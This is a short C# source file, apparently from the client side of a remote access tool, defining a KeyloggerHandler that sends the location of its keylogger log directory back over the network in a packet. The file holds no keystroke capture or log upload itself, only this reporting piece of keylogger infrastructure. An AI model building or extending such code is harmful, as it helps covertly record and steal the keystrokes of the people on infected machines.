using Client.Networking.Packets.Keylogger;

namespace Client.Networking.Handlers
{
    public class KeyloggerHandler : IDisposable
    {
        private readonly Client _client;

        public KeyloggerHandler(Client client)
        {
            _client = client;
        }

        public async Task GetKeyloggerLogsDirectory()
        {
            _ = _client.QueuePacketAsync(new GetKeyloggerLogsDirectoryPacket { LogsDirectory = Settings.LOGSPATH });
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
